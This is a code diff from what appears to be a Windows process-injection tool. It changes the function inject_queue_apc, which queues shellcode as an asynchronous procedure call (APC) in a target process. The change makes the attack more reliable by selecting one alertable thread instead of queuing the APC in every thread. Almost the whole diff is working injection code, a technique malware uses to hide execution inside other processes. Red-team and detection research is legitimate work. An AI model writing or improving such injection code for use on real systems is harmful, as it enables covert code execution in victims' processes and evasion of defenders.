@@ -44,7 +44,7 @@ bool inject_queue_apc(uint32_t pid, uint32_t tid, RemoteProcessMemoryMethod meth
         }
 
         wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());
-        res = sysapi::ApcQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
+        res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
         if (!res) {
             return false;
         }
@@ -55,25 +55,20 @@ bool inject_queue_apc(uint32_t pid, uint32_t tid, RemoteProcessMemoryMethod meth
         return true;
     }
 
-    // TODO: find only alertable threads
+    wprintf(L"\nQueueing APC with shellcode in alertable thread\n");
 
-    wprintf(L"\nQueueing APC with shellcode in all threads\n");
-
-    sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get());
+    auto ThreadHandle = process_find_alertable_thread(ProcessHandle.get());
     if (ThreadHandle == NULL) {
         return false;
     }
 
-    do {
-        wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());
-        res = sysapi::ApcQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
-        if (!res) {
-            return false;
-        }
+    wprintf(L"  [+] alertable thread found, HANDLE = 0x%p\n", ThreadHandle.get());
+    res = sysapi::ThreadQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
+    if (!res) {
+        return false;
+    }
 
-        wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", ThreadHandle.get());
-        ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get(), ThreadHandle.get());
-    } while (ThreadHandle != NULL);
+    wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", ThreadHandle.get());
 
     wprintf(L"\nSuccess\n");
     return true;
